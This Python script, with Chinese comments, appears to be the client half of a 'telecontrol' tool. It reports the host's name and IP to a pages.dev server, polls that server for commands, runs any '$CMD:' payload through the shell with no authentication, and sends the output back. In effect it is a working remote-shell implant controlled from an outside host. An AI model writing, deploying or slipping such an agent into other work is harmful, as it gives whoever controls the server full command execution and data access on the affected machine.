import requests
import time
import json
import subprocess
import sys
import socket
import threading
from datetime import datetime

# ========== 配置区域 ==========
BASE_URL = "https://ip-telecontrol.pages.dev/"          # 替换为您的 Worker 实际地址
CLIENT_ID = socket.gethostname()+"["+socket.gethostbyname(socket.gethostname())+"]"            # 生成唯一ID: 主机名 + "-py"
POLL_INTERVAL = 5                           # 命令轮询间隔(秒)
HEARTBEAT_INTERVAL = 30                      # 心跳注册间隔(秒)
REQUEST_TIMEOUT = 10                         # HTTP 请求超时
# ==============================

# 全局退出标志，用于通知子线程停止
exit_flag = threading.Event()

def log(msg, level="INFO"):
    """简单日志，带时间戳和线程名"""
    t = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    thread = threading.current_thread().name
    print(f"[{t}] [{thread}] [{level}] {msg}")

def signup():
    """向 /signupdrugs 发送心跳 (独立请求，不重用连接)"""
    url = BASE_URL + "/signupdrugs"
    payload = {
        "id": CLIENT_ID,
        "time": time.strftime("%y.%m.%d_%H.%M.%S")
    }
    try:
        # 直接使用 requests.post，不通过 Session
        resp = requests.post(url, json=payload, timeout=REQUEST_TIMEOUT)
        resp.raise_for_status()
        data = resp.json()
        if data.get("success"):
            log(f"心跳注册成功")
        else:
            log(f"心跳注册失败: {data}", "WARN")
    except Exception as e:
        log(f"心跳请求异常: {e}", "ERROR")

def poll_command():
    """轮询 /heartpumb，获取命令 (独立请求)"""
    url = BASE_URL + "/heartpumb"
    payload = {"id": CLIENT_ID}
    try:
        resp = requests.post(url, json=payload, timeout=REQUEST_TIMEOUT)
        resp.raise_for_status()
        return resp.json()
    except Exception as e:
        log(f"轮询命令异常: {e}", "ERROR")
        return None





def sys_command(cmd_str):
    """
    执行系统命令，返回 (head, body)
    head: 简略状态 (例如 "OK" 或 "ERROR")
    body: 命令的标准输出 + 标准错误
    """

    log(f"执行命令: {cmd_str}")
    try:
        # 使用 subprocess 执行，捕获输出
        result = subprocess.run(
            cmd_str,
            shell=True,
            capture_output=True,
            text=True,
            timeout=30  # 防止命令卡死
        )
        head = f"'{CLIENT_ID}' successfully run command with return value {result.returncode}"
        body = result.stdout + result.stderr
        if not body:
            body = "(无输出)"
        return head, body
    except subprocess.TimeoutExpired:
        log("命令执行超时", "WARN")
        return f"'{CLIENT_ID}' running command overtime", "命令执行超过30秒"
    except Exception as e:
        log(f"执行命令异常: {e}", "ERROR")
        return f"'{CLIENT_ID}' failed in running command", str(e)


def execute_command(cmd_str):

    log(f"处理命令: {cmd_str}")
    cmds=cmd_str.split(":")
    signal=cmds[0]
    command=":".join(cmds[1:])
    try:
        if signal=="$CMD":
            return sys_command(command)
        elif signal=="$HBTIME":
            POLL_INTERVAL = str(command)
            return f"'{CLIENT_ID}' changed heartbeat time",command
        else:
            return f"'{CLIENT_ID}' received illegal command",command
    except Exception as e:
        return f"'{CLIENT_ID}' error execusing command",e




def submit_response(cmd_head, cmd_body):
    """向 /response 提交命令执行结果 (独立请求)"""
    url = BASE_URL + "/response"
    payload = {
        "id": CLIENT_ID,
        "head": cmd_head,
        "body": cmd_body
    }
    try:
        resp = requests.post(url, json=payload, timeout=REQUEST_TIMEOUT)
        resp.raise_for_status()
        data = resp.json()
        if data.get("success"):
            log("结果提交成功")
        else:
            log(f"结果提交失败: {data}", "WARN")
    except Exception as e:
        log(f"提交结果异常: {e}", "ERROR")

def heartbeat_loop():
    """心跳线程：定期执行 signup()"""
    log("心跳线程启动")
    while not exit_flag.is_set():
        signup()
        # 等待指定间隔，但每秒检查一次退出标志，实现快速响应退出
        for _ in range(HEARTBEAT_INTERVAL):
            if exit_flag.wait(1):
                break
    log("心跳线程结束")

def polling_loop():
    """轮询线程：定期执行命令轮询、执行、提交"""
    log("轮询线程启动")
    while not exit_flag.is_set():
        resp_data = poll_command()
        if resp_data and resp_data.get("success"):
            is_me = resp_data.get("isme", False)
            cmd = resp_data.get("cmd", "")
            log(f"轮询返回: isme={is_me}, cmd={cmd}")

            if is_me:
                if cmd == "$SIGNUP":
                    log("收到 $SIGNUP 标记，无需执行")
                elif cmd == "$NOT_ME":
                    # 理论上 isme=true 不会出现 NOT_ME，但保留逻辑
                    pass
                else:
                    # 真正的命令，执行并提交结果
                    head, body = execute_command(cmd)
                    if head is not None:
                        submit_response(head, body)
        else:
            log("轮询无效响应，稍后重试", "WARN")

        # 等待下一个轮询间隔，同时可被退出事件打断
        for _ in range(POLL_INTERVAL):
            if exit_flag.wait(1):
                break

    log("轮询线程结束")

def main():
    log(f"接收端启动，CLIENT_ID = {CLIENT_ID}")
    log(f"心跳间隔: {HEARTBEAT_INTERVAL}s, 轮询间隔: {POLL_INTERVAL}s")

    # 创建并启动两个线程
    t_heart = threading.Thread(target=heartbeat_loop, name="Heartbeat")
    t_poll = threading.Thread(target=polling_loop, name="Polling")
    t_heart.daemon = True   # 设为守护线程，主线程退出时自动结束（但我们使用exit_flag优雅退出）
    t_poll.daemon = True
    t_heart.start()
    t_poll.start()

    try:
        # 主线程等待，直到收到 KeyboardInterrupt
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        log("收到中断信号，正在停止线程...")
        exit_flag.set()      # 通知所有子线程退出
        # 等待线程结束（可选，但设为daemon后主线程退出时会被强制结束，这里等待一下更干净）
        t_heart.join(timeout=2)
        t_poll.join(timeout=2)
        log("接收端已停止")
        sys.exit(0)

if __name__ == "__main__":
    main()